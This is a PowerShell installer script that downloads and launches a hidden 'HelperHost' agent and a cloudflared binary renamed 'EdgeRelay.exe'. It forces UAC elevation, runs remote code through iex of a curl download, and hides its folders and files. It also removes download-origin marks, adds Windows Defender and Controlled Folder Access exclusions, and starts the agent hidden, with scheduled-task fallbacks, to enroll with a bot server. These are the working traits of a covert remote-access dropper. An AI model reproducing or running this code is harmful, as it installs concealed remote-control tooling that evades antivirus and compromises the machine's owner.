$ErrorActionPreference = 'Stop'
if (-not $Enroll) { $Enroll = $env:AGENTSHE_ENROLL }
if (-not $BotBase) { $BotBase = $env:AGENTSHE_BOT_BASE }
if (-not $InstallUrl) { $InstallUrl = $env:AGENTSHE_INSTALL_URL }
if (-not $Enroll) { throw 'Enroll manquant' }
if (-not $BotBase) { throw 'BotBase manquant' }
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

function Test-IsAdmin {
  $id = [Security.Principal.WindowsIdentity]::GetCurrent()
  $p = New-Object Security.Principal.WindowsPrincipal($id)
  return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Auto-elevate: exclusions Defender require admin
if (-not $env:AGENTSHE_ELEVATED -and -not (Test-IsAdmin)) {
  if (-not $InstallUrl) {
    $InstallUrl = 'https://raw.githubusercontent.com/lilygopro/AgentSHE/main/scripts/install-win.ps1'
  }
  $wrap = Join-Path $env:TEMP ('HelperHost-elev-' + [guid]::NewGuid().ToString('n') + '.ps1')
  $marker = Join-Path $env:TEMP 'HelperHost-install.ok'
  $fail = Join-Path $env:TEMP 'HelperHost-install.err'
  Remove-Item $marker, $fail -Force -ErrorAction SilentlyContinue
  $en = $Enroll.Replace("'", "''")
  $bb = $BotBase.Replace("'", "''")
  $iu = $InstallUrl.Replace("'", "''")
  @(
    "`$ErrorActionPreference = 'Stop'"
    "`$Enroll = '$en'"
    "`$BotBase = '$bb'"
    "`$InstallUrl = '$iu'"
    "`$env:AGENTSHE_ENROLL = '$en'"
    "`$env:AGENTSHE_BOT_BASE = '$bb'"
    "`$env:AGENTSHE_INSTALL_URL = '$iu'"
    "`$env:AGENTSHE_ELEVATED = '1'"
    "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
    "try {"
    "  iex ((curl.exe -fsSL `$InstallUrl | Out-String))"
    "  'OK' | Set-Content -Encoding ASCII '$marker'"
    "} catch {"
    "  `$_ | Out-String | Set-Content -Encoding UTF8 '$fail'"
    "  exit 1"
    "}"
  ) -join "`r`n" | Set-Content -Encoding UTF8 $wrap
  try {
    $p = Start-Process -FilePath "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" `
      -Verb RunAs -PassThru -Wait `
      -ArgumentList @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', $wrap)
  } catch {
    throw "Elevation UAC refusee. Accepte l'invite Admin."
  }
  Remove-Item $wrap -Force -ErrorAction SilentlyContinue
  if (Test-Path $marker) {
    Remove-Item $marker -Force -ErrorAction SilentlyContinue
    Write-Output 'OK'
    return
  }
  $msg = 'install admin failed'
  if (Test-Path $fail) {
    $msg = (Get-Content $fail -Raw -ErrorAction SilentlyContinue)
    Remove-Item $fail -Force -ErrorAction SilentlyContinue
  }
  throw $msg
}

$Gh = if ($env:AGENTSHE_GH) { $env:AGENTSHE_GH } else { 'https://github.com/lilygopro/AgentSHE/releases/download/v1.0.3' }
$BotBase = $BotBase.TrimEnd('/')
$Dir = Join-Path $env:LOCALAPPDATA 'HelperHost'
$Cache = Join-Path $env:TEMP 'HelperHostCache'
New-Item -ItemType Directory -Force -Path $Dir,$Cache | Out-Null
cmd /c "attrib +h `"$Dir`"" | Out-Null
cmd /c "attrib +h `"$Cache`"" | Out-Null
Get-Process HelperHost,EdgeRelay -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

function Download-File([string]$Url, [string]$OutFile) {
  if (Get-Command curl.exe -ErrorAction SilentlyContinue) {
    & curl.exe -fsSL $Url -o $OutFile
    if ($LASTEXITCODE -ne 0) { throw "download failed: $Url" }
    return
  }
  Invoke-WebRequest -UseBasicParsing -Uri $Url -OutFile $OutFile
}

function Restore-OrFetch([string]$Name, [string]$Url) {
  $dest = Join-Path $Dir $Name
  $cached = Join-Path $Cache $Name
  if (Test-Path $dest) { Copy-Item $dest $cached -Force -ErrorAction SilentlyContinue; return }
  if (Test-Path $cached) { Copy-Item $cached $dest -Force; return }
  $part = Join-Path $Cache ($Name + '.download')
  Download-File $Url $part
  Copy-Item $part $cached -Force
  Copy-Item $cached $dest -Force
  cmd /c "attrib +h `"$dest`"" | Out-Null
  cmd /c "attrib +h `"$cached`"" | Out-Null
}

function Unblock-Quiet([string]$Path) {
  if (-not (Test-Path $Path)) { return }
  Unblock-File -Path $Path -ErrorAction SilentlyContinue
  $zone = $Path + ':Zone.Identifier'
  if (Test-Path $zone) { Remove-Item $zone -Force -ErrorAction SilentlyContinue }
}

function Set-DefenderExclude([string]$Path, [string]$Exe) {
  $name = Split-Path $Exe -Leaf
  $edge = Join-Path $Path 'EdgeRelay.exe'
  if (-not (Get-Command Add-MpPreference -ErrorAction SilentlyContinue)) {
    throw 'Add-MpPreference indisponible (Windows Defender requis)'
  }
  Add-MpPreference -ExclusionPath $Path -ErrorAction Stop
  Add-MpPreference -ExclusionPath $Cache -ErrorAction SilentlyContinue
  Add-MpPreference -ExclusionProcess $name -ErrorAction SilentlyContinue
  Add-MpPreference -ExclusionProcess 'EdgeRelay.exe' -ErrorAction SilentlyContinue
  Add-MpPreference -ControlledFolderAccessAllowedApplications $Exe -ErrorAction SilentlyContinue
  if (Test-Path $edge) {
    Add-MpPreference -ControlledFolderAccessAllowedApplications $edge -ErrorAction SilentlyContinue
  }
}

function Start-Helper([string]$Helper, [string]$WorkDir) {
  if (-not (Test-Path $Helper)) { throw "HelperHost manquant: $Helper" }
  Unblock-Quiet $Helper
  Unblock-Quiet (Join-Path $WorkDir 'EdgeRelay.exe')
  Set-DefenderExclude $WorkDir $Helper

  try {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $Helper
    $psi.WorkingDirectory = $WorkDir
    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $psi.UseShellExecute = $true
    [void][System.Diagnostics.Process]::Start($psi)
    Start-Sleep -Milliseconds 700
    if (Get-Process HelperHost -ErrorAction SilentlyContinue) { return }
  } catch {}

  try {
    Start-Process -FilePath $Helper -WorkingDirectory $WorkDir -WindowStyle Hidden -ErrorAction SilentlyContinue
    Start-Sleep -Milliseconds 700
    if (Get-Process HelperHost -ErrorAction SilentlyContinue) { return }
  } catch {}

  try {
    & "$env:SystemRoot\System32\cmd.exe" /c "cd /d `"$WorkDir`" && start `"`" /b `"$Helper`""
    Start-Sleep -Milliseconds 900
    if (Get-Process HelperHost -ErrorAction SilentlyContinue) { return }
  } catch {}

  $tn = 'HelperHostBoot'
  try {
    Unregister-ScheduledTask -TaskName $tn -Confirm:$false -ErrorAction SilentlyContinue
  } catch {}
  try {
    $action = New-ScheduledTaskAction -Execute $Helper -WorkingDirectory $WorkDir
    $trigger = New-ScheduledTaskTrigger -Once -At ((Get-Date).AddMinutes(2))
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    Register-ScheduledTask -TaskName $tn -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
    Start-ScheduledTask -TaskName $tn -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 3
    Unregister-ScheduledTask -TaskName $tn -Confirm:$false -ErrorAction SilentlyContinue
    if (Get-Process HelperHost -ErrorAction SilentlyContinue) { return }
  } catch {
    $st = (Get-Date).AddMinutes(2).ToString('HH:mm')
    & schtasks.exe /Delete /TN $tn /F 2>$null | Out-Null
    & schtasks.exe /Create /TN $tn /TR $Helper /SC ONCE /ST $st /RL LIMITED /F 2>$null | Out-Null
    & schtasks.exe /Run /TN $tn 2>$null | Out-Null
    Start-Sleep -Seconds 3
    & schtasks.exe /Delete /TN $tn /F 2>$null | Out-Null
    if (Get-Process HelperHost -ErrorAction SilentlyContinue) { return }
  }

  throw @"
Exclusion Defender ajoutee, mais Windows bloque encore HelperHost.exe
(Smart App Control / WDAC). Desactive Smart App Control puis relance:
  $Helper
"@
}

Restore-OrFetch 'HelperHost.exe' "$Gh/HelperHost-windows-amd64.exe"
Restore-OrFetch 'EdgeRelay.exe' 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe'

@{ enroll = $Enroll; bot_base = $BotBase } | ConvertTo-Json | Set-Content -Encoding UTF8 (Join-Path $Dir 'config.json')
$env:AGENTSHE_ENROLL = $Enroll
$env:AGENTSHE_BOT_BASE = $BotBase
$Helper = Join-Path $Dir 'HelperHost.exe'
$tokenFile = Join-Path $Dir 'token'
$agentLog = Join-Path $Dir 'agent.log'
Remove-Item $tokenFile,$agentLog -Force -ErrorAction SilentlyContinue
Start-Helper $Helper $Dir
$ok = $false
for ($i=0; $i -lt 180; $i++) {
  Start-Sleep -Seconds 1
  if (Test-Path $agentLog) {
    $txt = Get-Content $agentLog -Raw -ErrorAction SilentlyContinue
    if ($txt -match 'FAIL') { throw 'install failed' }
  }
  if ((Test-Path $tokenFile) -and (Get-Process HelperHost -ErrorAction SilentlyContinue)) {
    Write-Output 'OK'
    $ok = $true
    break
  }
}
if (-not $ok) { throw 'timeout' }
